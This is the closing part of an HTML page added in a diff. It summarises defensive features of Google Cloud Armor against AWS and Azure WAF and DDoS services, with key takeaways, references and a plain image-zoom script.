+<td>Adaptive tuning + rapid response</td>
+</tr>
+<tr>
+<td>Rate limiting</td>
+<td>throttle / rate_based_ban, multi-key</td>
+<td>WAF rate-based rules</td>
+<td>WAF rate-limit custom rules</td>
+</tr>
+<tr>
+<td>Bot management</td>
+<td>reCAPTCHA Enterprise integration</td>
+<td>AWS WAF Bot Control</td>
+<td>Bot protection rule set</td>
+</tr>
+<tr>
+<td>Named IP lists</td>
+<td>Address groups</td>
+<td>WAF IP sets</td>
+<td>IP match custom rules / groups</td>
+</tr>
+<tr>
+<td>Geo blocking</td>
+<td><code>origin.region_code</code> CEL</td>
+<td>WAF geo match</td>
+<td>Geo-filtering custom rules</td>
+</tr>
+<tr>
+<td>DDoS cost protection</td>
+<td>MP+ bill protection</td>
+<td>Shield Advanced cost protection</td>
+<td>DDoS Protection cost protection</td>
+</tr>
+<tr>
+<td>Attach point</td>
+<td>Global External LB / CDN / hybrid NEG</td>
+<td>CloudFront / ALB / API-GW / AppSync</td>
+<td>Front Door / App Gateway</td>
+</tr>
+<tr>
+<td>DDoS response team</td>
+<td>Google support (Plus)</td>
+<td>AWS Shield Response Team (SRT)</td>
+<td>Azure Rapid Response (DRR)</td>
+</tr>
+</tbody>
+</table>
+<p>See <code>../../../../cloud/AWS/Security/WAF/README.md</code>, <code>../../../../cloud/AWS/Security/Shield/README.md</code>, <code>../../../../cloud/Azure/Security/DDoS-Protection/README.md</code>, and <code>../../../../cloud/Azure/Networking/Front-Door/README.md</code> for the per-provider deep dives.</p>
+<hr />
+<h2 id="9-key-takeaways">9. Key Takeaways</h2>
+<ul>
+<li><strong>Cloud Armor enforces at the GFE edge, in front of the Global External Load Balancer</strong> — malicious traffic is dropped before it costs you backend compute, egress, or autoscale spend.</li>
+<li><strong>L3/L4 volumetric DDoS is always-on and free</strong> (Standard tier); <strong>L7 WAF, rate limiting, bot management, and Adaptive Protection ML</strong> are the layer you configure (Managed Protection Plus for the advanced/ML features).</li>
+<li><strong>Rules are ordered by ascending priority and are first-match-wins</strong>, with a default rule at <code>2147483647</code>; a broad allow at low priority silently shadows your denies — order is a security control.</li>
+<li><strong>Preconfigured WAF rules wrap OWASP ModSecurity CRS 3.3</strong> for SQLi/XSS/LFI/RFI/RCE; tune with <code>sensitivity</code> (0–4) and per-subsignature <code>opt_out_rule_ids</code>, always via <strong>preview mode</strong> first to avoid self-inflicted outages.</li>
+<li><strong>Rate-based ban keyed on identity (not just IP)</strong> is the durable answer to credential stuffing and distributed L7 floods, because IP-only keying is defeated by proxy rotation and collateral-damages NAT.</li>
+<li><strong>Adaptive Protection detects L7 DDoS with per-backend ML and proposes a mitigating rule in seconds</strong> — the reason 46 Mrps (2022) and 398 Mrps (2023) events were non-events — but has cold-start and low-and-slow blind spots, so pair it with static rules.</li>
+<li><strong>The 398 Mrps HTTP/2 Rapid Reset (CVE-2023-44487)</strong> proved that origin-side rate limiting is futile at scale; only an edge with Mrps headroom plus a protocol-aware heuristic survives.</li>
+<li><strong>A WAF is a compensating control, not a cure</strong> — parameterized queries, output encoding, and MFA at the origin close the actual holes; the WAF buys time and virtual-patches (Log4Shell).</li>
+<li><strong>Force all traffic through the LB</strong> — no public-IP backends, firewalls scoped to Google LB ranges, and an LB-injected secret header — or attackers bypass Cloud Armor entirely by discovering the origin IP.</li>
+<li><strong>Log VERBOSE and export to BigQuery/SIEM</strong> — the <code>preconfiguredExprIds</code> subsignature field is what makes tuning and detection data-driven rather than guesswork.</li>
+</ul>
+<hr />
+<h2 id="10-references">10. References</h2>
+<ul>
+<li>Google Cloud — <em>Cloud Armor overview</em> and <em>security policies</em>: https://cloud.google.com/armor/docs/security-policy-overview</li>
+<li>Google Cloud — <em>Preconfigured WAF rules (OWASP CRS 3.3)</em>: https://cloud.google.com/armor/docs/rule-tuning</li>
+<li>Google Cloud — <em>Rate limiting overview</em>: https://cloud.google.com/armor/docs/rate-limiting-overview</li>
+<li>Google Cloud — <em>Adaptive Protection</em>: https://cloud.google.com/armor/docs/adaptive-protection-overview</li>
+<li>Google Cloud — <em>bot management with reCAPTCHA Enterprise</em>: https://cloud.google.com/armor/docs/bot-management</li>
+<li>Google Cloud blog — <em>How Google Cloud blocked the largest Layer 7 DDoS attack (398 Mrps, 2023)</em>: https://cloud.google.com/blog/products/identity-security/google-cloud-mitigated-largest-ddos-attack-peaking-above-398-million-rps</li>
+<li>Google Cloud blog — <em>How we mitigated a 46 Mrps DDoS (2022)</em>: https://cloud.google.com/blog/products/identity-security/how-google-cloud-blocked-largest-layer-7-ddos-attack-at-46-million-rps</li>
+<li>CVE-2023-44487 — HTTP/2 Rapid Reset: https://nvd.nist.gov/vuln/detail/CVE-2023-44487</li>
+<li>CISA / joint advisory — <em>HTTP/2 Rapid Reset vulnerability</em>: https://www.cisa.gov/news-events/alerts</li>
+<li>OWASP ModSecurity Core Rule Set (CRS): https://coreruleset.org/</li>
+<li>MITRE ATT&amp;CK — T1498 Network Denial of Service, T1499 Endpoint DoS, T1190 Exploit Public-Facing Application, T1110 Brute Force</li>
+<li>NIST SP 800-61r2 — Computer Security Incident Handling Guide</li>
+<li>RFC 9113 — HTTP/2 (stream multiplexing and <code>RST_STREAM</code> semantics)</li>
+<li>Repo cross-references: <code>../../../../web/Server-Side-Attacks/SQLi/README.md</code>, <code>../../../../web/Client-Side-Attacks/XSS/README.md</code>, <code>../../../../web/APIs/API-Security/README.md</code>, <code>../../../../web/Browser-Security/User-Agents/README.md</code></li>
+</ul>
+
+  <!-- ── Image zoom overlay ───────────────────────────── -->
+  <div id="img-zoom-overlay">
+    <div id="img-zoom-wrap">
+      <img id="img-zoom-el" src="" alt="">
+    </div>
+    <div id="img-zoom-controls">
+      <button id="zoom-out-btn"  title="Zoom out (scroll down / minus)">&#8722;</button>
+      <span   id="img-zoom-level">100%</span>
+      <button id="zoom-in-btn"   title="Zoom in (scroll up / plus)">&#43;</button>
+      <button id="zoom-reset-btn" title="Reset (key: 0)">&#8635;</button>
+    </div>
+    <button id="img-zoom-close" title="Close (Esc)">&#10005;</button>
+    <span   id="img-zoom-hint">Scroll to zoom &nbsp;·&nbsp; Drag to pan &nbsp;·&nbsp; Esc to close</span>
+  </div>
+
+  <script>
+  (function () {
+    var overlay   = document.getElementById('img-zoom-overlay');
+    var wrap      = document.getElementById('img-zoom-wrap');
+    var zoomEl    = document.getElementById('img-zoom-el');
+    var levelEl   = document.getElementById('img-zoom-level');
+    var closeBtn  = document.getElementById('img-zoom-close');
+    var btnIn     = document.getElementById('zoom-in-btn');
+    var btnOut    = document.getElementById('zoom-out-btn');
+    var btnReset  = document.getElementById('zoom-reset-btn');
+
+    var scale = 1, tx = 0, ty = 0;
+    var MIN = 0.15, MAX = 12, STEP = 0.2;
+
+    function applyTransform() {
+      zoomEl.style.transform =
+        'translate(' + tx + 'px,' + ty + 'px) scale(' + scale + ')';
+      levelEl.textContent = Math.round(scale * 100) + '%';
+    }
+
+    function openOverlay(src, alt) {
+      zoomEl.src = src;
+      zoomEl.alt = alt || '';
+      scale = 1; tx = 0; ty = 0;
+      applyTransform();
+      overlay.classList.add('active');
+      document.body.style.overflow = 'hidden';
+    }
+
+    function closeOverlay() {
+      overlay.classList.remove('active');
+      document.body.style.overflow = '';
+      zoomEl.src = '';
+    }
+
+    // Wire click on every page image.
+    // Uses closest('a') so anchor wrappers at ANY ancestor depth are caught.
+    // Standalone images (no ancestor <a>) get the listener on the <img> itself.
+    document.querySelectorAll('img:not(#img-zoom-el)').forEach(function (img) {
+      var anchor = img.closest('a');
+      if (anchor) {
+        anchor.style.cursor = 'zoom-in';
+        anchor.addEventListener('click', function (e) {
+          e.preventDefault();
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      } else {
+        img.style.cursor = 'zoom-in';
+        img.addEventListener('click', function (e) {
+          e.stopPropagation();
+          openOverlay(img.src, img.alt);
+        });
+      }
+    });
+
+    closeBtn.addEventListener('click', closeOverlay);
+    overlay.addEventListener('click', function (e) {
+      if (e.target === overlay || e.target === wrap) closeOverlay();
+    });
+
+    document.addEventListener('keydown', function (e) {
+      if (!overlay.classList.contains('active')) return;
+      if (e.key === 'Escape') { closeOverlay(); return; }
+      if (e.key === '+' || e.key === '=') { scale = Math.min(MAX, scale + STEP); applyTransform(); }
+      if (e.key === '-')                  { scale = Math.max(MIN, scale - STEP); applyTransform(); }
+      if (e.key === '0')                  { scale = 1; tx = 0; ty = 0; applyTransform(); }
+    });
+
+    btnIn.addEventListener('click',    function () { scale = Math.min(MAX, scale + STEP); applyTransform(); });
+    btnOut.addEventListener('click',   function () { scale = Math.max(MIN, scale - STEP); applyTransform(); });
+    btnReset.addEventListener('click', function () { scale = 1; tx = 0; ty = 0; applyTransform(); });
+
+    // Scroll-wheel zoom (zoom towards cursor)
+    wrap.addEventListener('wheel', function (e) {
+      e.preventDefault();
+      var rect  = wrap.getBoundingClientRect();
+      var cx    = e.clientX - rect.left  - rect.width  / 2;
+      var cy    = e.clientY - rect.top   - rect.height / 2;
+      var delta = e.deltaY < 0 ? STEP : -STEP;
+      var newScale = Math.min(MAX, Math.max(MIN, scale + delta));
+      var ratio    = newScale / scale;
+      tx = cx + ratio * (tx - cx);
+      ty = cy + ratio * (ty - cy);
+      scale = newScale;
+      applyTransform();
+    }, { passive: false });
+
+    // Mouse drag to pan
+    var dragging = false, dsx = 0, dsy = 0, stx = 0, sty = 0;
+    wrap.addEventListener('mousedown', function (e) {
+      dragging = true; wrap.classList.add('dragging');
+      dsx = e.clientX; dsy = e.clientY;
+      stx = tx;        sty = ty;
+      e.preventDefault();
+    });
+    document.addEventListener('mousemove', function (e) {
+      if (!dragging) return;
+      tx = stx + (e.clientX - dsx);
+      ty = sty + (e.clientY - dsy);
+      applyTransform();
+    });
+    document.addEventListener('mouseup', function () {
+      if (dragging) { dragging = false; wrap.classList.remove('dragging'); }
+    });
+
+    // Touch: pinch-to-zoom + single-finger pan
+    var lastDist = 0, pinchStartScale = 1;
+    wrap.addEventListener('touchstart', function (e) {
+      if (e.touches.length === 2) {
+        var dx = e.touches[0].clientX - e.touches[1].clientX;
+        var dy = e.touches[0].clientY - e.touches[1].clientY;
+        lastDist = Math.hypot(dx, dy);
+        pinchStartScale = scale;
+      } else if (e.touches.length === 1) {
+        dragging = true;
+        dsx = e.touches[0].clientX; dsy = e.touches[0].clientY;
+        stx = tx; sty = ty;
+      }
+    }, { passive: true });
+    wrap.addEventListener('touchmove', function (e) {
+      if (e.touches.length === 2) {
+        e.preventDefault();
+        var dx   = e.touches[0].clientX - e.touches[1].clientX;
+        var dy   = e.touches[0].clientY - e.touches[1].clientY;
+        var dist = Math.hypot(dx, dy);
+        scale = Math.min(MAX, Math.max(MIN, pinchStartScale * (dist / lastDist)));
+        applyTransform();
+      } else if (e.touches.length === 1 && dragging) {
+        tx = stx + (e.touches[0].clientX - dsx);
+        ty = sty + (e.touches[0].clientY - dsy);
+        applyTransform();
+      }
+    }, { passive: false });
+    wrap.addEventListener('touchend', function () { dragging = false; });
+  })();
+  </script>
+</body>
+</html>
